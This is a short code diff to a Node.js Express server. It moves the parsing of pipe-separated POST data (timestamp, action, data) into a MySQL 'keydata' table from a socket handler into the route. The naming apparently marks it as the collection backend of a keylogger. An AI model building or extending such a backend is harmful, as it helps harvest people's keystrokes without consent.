@@ -25,7 +25,14 @@ app.post('/', upload.any(), (req, res) => {
     console.log(req.method + ' ' + req.url);
     var lol = req.body;
     socket.emit('lol', lol);
-    socket.emit('kitsune', lol);
+    var splitted = lol.toString().split("|");
+    var one = splitted[0];
+    var two = splitted[1];
+    var three = splitted[2];
+    var sqll = 'INSERT INTO keydata(TimeStamps, Action, Data) VALUES(?, ?, ?)';
+    connection.query(sqll, [one, two, three], function (err, data) {
+      if (err) throw err;
+    });
 });
 
 
@@ -43,17 +50,6 @@ app.post('/suffer', upload.any(), (req, res) => {
       res.redirect('/heh');
     }
 });
-socket.on("kitsune", (data) =>{
-    var splitted = lol.toString().split("|");
-    var one = splitted[0];
-    var two = splitted[1];
-    var three = splitted[2];
-    var sqll = 'INSERT INTO keydata(TimeStamps, Action, Data) VALUES(?, ?, ?)';
-    connection.query(sqll, [one, two, three], function (err, data) {
-      if (err) throw err;
-    });
-});
-
 
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/login.html');
